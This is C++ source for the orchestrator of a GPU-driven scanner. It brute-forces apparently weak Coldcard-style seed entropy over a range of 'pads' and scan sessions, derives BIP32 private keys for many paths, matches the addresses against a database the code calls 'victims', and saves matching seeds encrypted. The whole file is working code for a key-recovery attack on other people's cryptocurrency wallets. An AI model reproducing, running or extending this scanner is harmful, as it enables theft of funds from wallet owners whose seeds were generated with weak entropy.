#include "scanner/orchestrator.hpp"

#include "scanner/address_encode.hpp"
#include "scanner/batch_derive.hpp"
#include "scanner/bip32.hpp"
#include "scanner/bip32_internal.hpp"
#include "scanner/bitcoin_derive.hpp"
#include "scanner/checkpoint.hpp"
#include "scanner/coldcard_seed.hpp"
#include "scanner/console_style.hpp"
#include "scanner/crypto_aes.hpp"
#include "scanner/gpu_engine.hpp"
#include "scanner/match_db.hpp"
#include "scanner/pad_enumerator.hpp"
#include "scanner/victim_loader.hpp"

#include <atomic>
#include <algorithm>
#include <chrono>
#include <csignal>
#include <cmath>
#include <filesystem>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <thread>

#ifdef _WIN32
#define NOMINMAX
#include <windows.h>
#endif

namespace scanner {

namespace {

std::atomic<bool> g_interrupt{false};

constexpr int kInterruptChunkSeeds = 32;

#ifdef _WIN32
BOOL WINAPI console_handler(DWORD type) {
  if (type == CTRL_C_EVENT || type == CTRL_BREAK_EVENT) {
    g_interrupt = true;
    return TRUE;
  }
  return FALSE;
}
#else
void signal_handler(int) { g_interrupt = true; }
#endif

void install_signal_handlers() {
#ifdef _WIN32
  SetConsoleCtrlHandler(console_handler, TRUE);
#else
  std::signal(SIGINT, signal_handler);
#endif
}

std::string make_run_id() {
  const auto now = std::chrono::system_clock::now();
  const std::time_t t = std::chrono::system_clock::to_time_t(now);
  std::tm tm{};
#ifdef _WIN32
  localtime_s(&tm, &t);
#else
  localtime_r(&t, &tm);
#endif
  std::ostringstream oss;
  oss << std::put_time(&tm, "%Y%m%d-%H%M%S");
  return oss.str();
}

int clamp_gpu_util(int v) {
  if (v < 10) return 10;
  if (v > 100) return 100;
  return v;
}

}  // namespace

int Orchestrator::run_preflight(const OrchestratorOptions& opts) {
  ConsoleStyle style(!opts.no_color && opts.config.color_enabled);
  VictimSet victims;
  std::string err;
  if (!victims.load_from_cointrace_db(opts.config.cointrace_db_path, opts.config.cointrace_db_max_age_hours, err)) {
    std::cerr << err << "\n";
    return 1;
  }
  if (!err.empty()) std::cerr << style.value(err) << "\n";

  std::string gpu_name;
  size_t vram_mb = 0;
  const int device = opts.config.gpu_device_index;
  if (!GpuEngine::probe_device(device, gpu_name, vram_mb, err)) {
    std::cerr << style.value("CUDA probe failed: " + err) << "\n";
    std::cerr << style.value("Install NVIDIA driver + CUDA Toolkit 12.x, then rebuild.") << "\n";
    return 1;
  }

  std::cout << style.label("victims") << " " << style.value(std::to_string(victims.size())) << "\n";
  std::cout << style.label("snapshot") << " " << style.value(victims.snapshot_hash().substr(0, 16) + "…") << "\n";
  std::cout << style.label("gpu") << " " << style.value(gpu_name) << " (" << style.value(std::to_string(vram_mb) + " MB")
            << ")\n";
  std::cout << style.value("Preflight OK. Run: pnpm db:pull-d1:remote before scan if victims are stale.") << "\n";
  return 0;
}

int Orchestrator::run_benchmark(const OrchestratorOptions& opts) {
  const auto paths = build_derivation_paths(opts.config);
  VictimSet victims;
  std::string err;
  if (!victims.load_from_cointrace_db(opts.config.cointrace_db_path, opts.config.cointrace_db_max_age_hours, err)) {
    std::cerr << err << "\n";
    return 1;
  }

  GpuEngine gpu;
  if (!gpu.init(opts.config.gpu_device_index, victims, paths, err)) {
    std::cerr << "GPU init failed: " << err << "\n";
    return 1;
  }
  gpu.set_utilization_cap(100);

  std::vector<SeedCandidate> seeds;
  seeds.resize(32);
  for (auto& s : seeds) {
    s.pad = 0x00400001;
    s.scan_session = 8;
    s.entropy = coldcard_seed_entropy(s.pad, s.scan_session);
  }

  const auto masters = masters_for_seeds(seeds);
  std::vector<GpuHit> hits;
  const int iterations = 5;
  for (int i = 0; i < iterations; i++) {
    if (!gpu.process_master_batch(seeds, masters, hits, err)) {
      std::cerr << err << "\n";
      return 1;
    }
  }
  const double checks_per_sec = gpu.last_batch_checks_per_sec();
  std::cout << "benchmark: " << static_cast<int>(checks_per_sec) << " checks/s (GPU fused pipeline, batch "
            << seeds.size() << " seeds × " << paths.size() << " paths)\n";
  return 0;
}

int Orchestrator::run_scan(const OrchestratorOptions& opts) {
  install_signal_handlers();
  ConsoleStyle style(!opts.no_color && opts.config.color_enabled);

  if (opts.preflight_only) return run_preflight(opts);

  VictimSet victims;
  std::string err;
  if (!victims.load_from_cointrace_db(opts.config.cointrace_db_path, opts.config.cointrace_db_max_age_hours, err)) {
    std::cerr << err << "\n";
    return 1;
  }
  if (!err.empty()) std::cerr << style.value(err) << "\n";

  AesGcmCipher cipher;
  if (!cipher.load_key_file(opts.key_file, err)) {
    std::cerr << err << "\n";
    return 1;
  }

  std::filesystem::create_directories(opts.checkpoint_dir);
  std::filesystem::create_directories(std::filesystem::path(opts.matches_db_path).parent_path());

  MatchDb db;
  if (!db.open(opts.matches_db_path, err)) {
    std::cerr << err << "\n";
    return 1;
  }

  const int gpu_util = clamp_gpu_util(opts.gpu_util_override >= 0 ? opts.gpu_util_override : opts.config.gpu_util_pct);
  const auto paths = build_derivation_paths(opts.config);

  GpuEngine gpu;
  if (!gpu.init(opts.config.gpu_device_index, victims, paths, err)) {
    std::cerr << style.value("CUDA required for scan. " + err) << "\n";
    std::cerr << style.value("Install NVIDIA driver + CUDA Toolkit 12.x, then rebuild with CUDAToolkit found.") << "\n";
    return 1;
  }
  gpu.set_utilization_cap(gpu_util);

  PadEnumerator pads;
  pads.high_min = opts.config.pad_high_min;
  pads.high_max = opts.config.pad_high_max;
  pads.filter_high_min = opts.config.pad_high_filter_min;
  pads.filter_high_max = opts.config.pad_high_filter_max;

  const uint64_t pads_total = pads.total();
  uint64_t pad_start = opts.pad_start;
  uint64_t pad_end = opts.pad_end > 0 ? opts.pad_end : pads_total;

  std::string run_id = opts.run_id;
  bool resuming = false;
  CheckpointState ck{};

  if (!opts.fresh) {
    if (run_id.empty()) {
      if (auto resumable = db.get_latest_resumable(err)) {
        const std::string ck_path = checkpoint_path(opts.checkpoint_dir, resumable->run_id);
        if (std::filesystem::exists(ck_path)) {
          run_id = resumable->run_id;
        }
      }
    }
    if (!run_id.empty()) {
      if (load_checkpoint(opts.checkpoint_dir, run_id, ck, err)) {
        resuming = true;
      } else if (!opts.run_id.empty() || opts.resume) {
        std::cerr << err << "\n";
        return 1;
      } else {
        run_id.clear();
      }
    }
  }

  if (run_id.empty()) run_id = make_run_id();
  ck.run_id = run_id;
  ck.pads_total = pad_end;
  ck.victim_snapshot_hash = victims.snapshot_hash();
  ck.gpu_util_pct = gpu_util;
  double elapsed_base = 0;
  uint64_t seeds_tested = 0;
  uint64_t hits = 0;
  int64_t run_row_id = -1;

  if (resuming) {
    pad_start = ck.next_pad_index;
    seeds_tested = ck.seeds_tested;
    hits = ck.hits;
    elapsed_base = ck.elapsed_sec;
    if (ck.victim_snapshot_hash != victims.snapshot_hash()) {
      std::cerr << style.value("warning: victim snapshot changed since checkpoint") << "\n";
    }
    auto existing = db.get_run(run_id, err);
    if (existing) run_row_id = existing->id;
  } else if (opts.resume && !opts.run_id.empty()) {
    if (!load_checkpoint(opts.checkpoint_dir, run_id, ck, err)) {
      std::cerr << err << "\n";
      return 1;
    }
    pad_start = ck.next_pad_index;
    seeds_tested = ck.seeds_tested;
    hits = ck.hits;
    elapsed_base = ck.elapsed_sec;
    auto existing = db.get_run(run_id, err);
    if (existing) run_row_id = existing->id;
  }

  const std::string config_json = "gpu_util=" + std::to_string(gpu_util);
  if (run_row_id < 0) {
    run_row_id = db.create_scan_run(run_id, config_json, err);
    if (run_row_id < 0) {
      std::cerr << err << "\n";
      return 1;
    }
    db.insert_victim_import(victims.snapshot_hash(), victims.size(), err);
  }

  const int base_batch = std::max(1, opts.config.base_batch_seeds * gpu_util / 100);
  const uint32_t scan_min = opts.config.scan_session_min;
  const uint32_t scan_max = opts.config.scan_session_max;

  if (resuming) {
    std::cerr << "scan resumed run_id=" << run_id << " victims=" << victims.size() << " paths=" << paths.size()
              << " batch_seeds=" << base_batch << " gpu_util=" << gpu_util << "% from_pad=" << pad_start
              << " progress_interval=" << opts.config.progress_interval_sec << "s\n"
              << std::flush;
  } else {
    std::cerr << "scan started run_id=" << run_id << " victims=" << victims.size() << " paths=" << paths.size()
              << " batch_seeds=" << base_batch << " gpu_util=" << gpu_util << "% pads=" << pad_start << "-" << pad_end
              << " progress_interval=" << opts.config.progress_interval_sec << "s\n"
              << std::flush;
  }

  auto scan_start_clock = std::chrono::steady_clock::now();
  auto last_progress = scan_start_clock;
  double smoothed_pads_per_sec = 0;
  double last_checks_per_sec = 0;

  std::vector<SeedCandidate> seed_batch;
  seed_batch.reserve(static_cast<size_t>(base_batch));

  auto save_checkpoint_now = [&](uint64_t next_pad, const std::string& status) {
    ck.run_id = run_id;
    ck.config_hash = sha256_hex(config_json);
    ck.next_pad_index = next_pad;
    ck.pads_total = pad_end;
    ck.seeds_tested = seeds_tested;
    ck.hits = hits;
    ck.elapsed_sec =
        elapsed_base + std::chrono::duration<double>(std::chrono::steady_clock::now() - scan_start_clock).count();
    ck.victim_snapshot_hash = victims.snapshot_hash();
    ck.gpu_util_pct = gpu_util;
    save_checkpoint(opts.checkpoint_dir, ck, err);
    db.update_scan_run(run_row_id, ck.next_pad_index, seeds_tested, hits, status, err);
  };

  auto flush_batch = [&](uint64_t current_pad_index) -> int {
    if (seed_batch.empty()) return 0;
    const size_t path_count = paths.size();

    for (size_t off = 0; off < seed_batch.size();) {
      if (g_interrupt) {
        save_checkpoint_now(current_pad_index, "interrupted");
        seed_batch.clear();
        return 2;
      }

      const size_t chunk = std::min(static_cast<size_t>(kInterruptChunkSeeds), seed_batch.size() - off);
      std::vector<SeedCandidate> chunk_seeds(seed_batch.begin() + off, seed_batch.begin() + off + chunk);
      const auto masters = masters_for_seeds(chunk_seeds);
      std::vector<GpuHit> gpu_hits;
      if (!gpu.process_master_batch(chunk_seeds, masters, gpu_hits, err)) {
        std::cerr << err << "\n";
        return 1;
      }
      last_checks_per_sec = gpu.last_batch_checks_per_sec();

      for (const auto& hit : gpu_hits) {
        if (hit.seed_index >= chunk_seeds.size() || hit.path_index >= path_count) continue;
        const auto& seed = chunk_seeds[hit.seed_index];
        const auto& path = paths[hit.path_index];
        const auto priv = derive_privkey_for_path(seed.entropy, path);
        if (priv.size() != 32) continue;

        const auto pub = bip32_internal::privkey_to_pubkey33(priv);
        const auto pk_hash = hash160(pub);
        const std::string address = encode_address_for_path(path, pub.data(), pk_hash.data());
        const VictimEntry* victim = victims.find_by_address(address);
        if (!victim) {
          if (hit.victim_index < victims.entries().size()) victim = &victims.entries()[hit.victim_index];
        }
        if (!victim) continue;

        hits++;
        const std::string fp = sha256_hex(seed.entropy);
        std::vector<uint8_t> enc;
        if (!cipher.encrypt(seed.entropy, enc, err)) {
          std::cerr << err << "\n";
          continue;
        }
        const int64_t seed_id = db.upsert_seed(run_row_id, fp, seed.pad, seed.scan_session, enc, err);
        if (seed_id >= 0) {
          db.insert_match(seed_id, victim->address, address, path, err);
        }

        if (opts.config.show_live_matches) {
          const double elapsed =
              elapsed_base + std::chrono::duration<double>(std::chrono::steady_clock::now() - scan_start_clock).count();
          std::cout << style.tag_match() << " " << style.label("at") << " " << style.value(style.format_duration(elapsed))
                    << " | " << style.label("seed") << " " << style.value(style.abbrev(fp, opts.config.abbrev_len))
                    << " | " << style.label("pad") << " " << style.value(std::to_string(seed.pad)) << " | "
                    << style.label("scan") << " " << style.value(std::to_string(seed.scan_session)) << " | "
                    << style.label("derived") << " " << style.value(style.abbrev(address, opts.config.abbrev_len))
                    << " | " << style.label("victims") << " "
                    << style.value(style.abbrev(victim->address, opts.config.abbrev_len)) << "\n";
        }
      }

      seeds_tested += chunk;
      off += chunk;
    }
    seed_batch.clear();

    if ((current_pad_index + 1) % 1000 == 0) {
      save_checkpoint_now(current_pad_index + 1, "running");
    }
    return 0;
  };

  for (uint64_t pad_index = pad_start; pad_index < pad_end; pad_index++) {
    if (g_interrupt) {
      save_checkpoint_now(pad_index, "interrupted");
      break;
    }

    const uint32_t pad = pads.at(pad_index);
    if (!pads.passes_filter(pad)) continue;

    for (uint32_t scan_session = scan_min; scan_session <= scan_max; scan_session++) {
      if (g_interrupt) break;
      SeedCandidate sc;
      sc.pad = pad;
      sc.scan_session = scan_session;
      sc.entropy = coldcard_seed_entropy(pad, scan_session);
      seed_batch.push_back(std::move(sc));
      if (static_cast<int>(seed_batch.size()) >= base_batch) {
        const int rc = flush_batch(pad_index);
        if (rc == 1) return 1;
        if (rc == 2) break;
      }
    }

    const auto now = std::chrono::steady_clock::now();
    const double since_progress = std::chrono::duration<double>(now - last_progress).count();
    if (since_progress >= opts.config.progress_interval_sec) {
      const double elapsed = elapsed_base + std::chrono::duration<double>(now - scan_start_clock).count();
      const uint64_t pads_done = pad_index + 1;
      const double pads_per_sec = pads_done / std::max(elapsed, 0.001);
      smoothed_pads_per_sec =
          smoothed_pads_per_sec == 0 ? pads_per_sec
                                     : opts.config.eta_smoothing_alpha * pads_per_sec +
                                           (1.0 - opts.config.eta_smoothing_alpha) * smoothed_pads_per_sec;

      const double pct = 100.0 * static_cast<double>(pads_done) / static_cast<double>(pad_end);
      std::ostringstream pct_ss;
      pct_ss << std::fixed << std::setprecision(1) << pct << "%";

      std::string eta_str = "—";
      if (opts.config.show_eta && smoothed_pads_per_sec > 0 && pads_done > 0) {
        const double remaining = static_cast<double>(pad_end - pads_done) / smoothed_pads_per_sec;
        eta_str = "~" + style.format_duration(remaining);
      }

      std::cout << style.tag_scan() << " " << style.percent_value(pct_ss.str()) << " | " << style.label("pads") << " "
                << style.value(std::to_string(pads_done) + "/" + std::to_string(pad_end)) << " | "
                << style.label("seeds") << " " << style.value(std::to_string(seeds_tested)) << " | "
                << style.label("hits") << " " << style.hits_value(hits) << " | " << style.label("gpu") << " "
                << style.value(std::to_string(gpu_util) + "%") << " | " << style.label("ETA") << " "
                << style.value(eta_str) << " | "
                << style.value(std::to_string(static_cast<int>(last_checks_per_sec)) + " checks/s") << "\n";
      last_progress = now;
    }
  }

  if (!g_interrupt) {
    const int rc = flush_batch(pad_end > 0 ? pad_end - 1 : 0);
    if (rc == 1) return 1;
    if (rc == 2) g_interrupt = true;
  }

  const std::string final_status = g_interrupt ? "interrupted" : "completed";
  if (g_interrupt) {
    save_checkpoint_now(ck.next_pad_index > 0 ? ck.next_pad_index : pad_start, "interrupted");
  } else {
    ck.next_pad_index = pad_end;
    ck.seeds_tested = seeds_tested;
    ck.hits = hits;
    save_checkpoint(opts.checkpoint_dir, ck, err);
    db.update_scan_run(run_row_id, ck.next_pad_index, seeds_tested, hits, final_status, err);
  }

  if (g_interrupt) {
    std::cout << style.value("interrupted — checkpoint saved at pad " + std::to_string(ck.next_pad_index) +
                             ". Resume: scanner scan") << "\n";
    std::cout << style.value("(use --fresh to start a new run)") << "\n";
    return 130;
  }
  return 0;
}

}  // namespace scanner
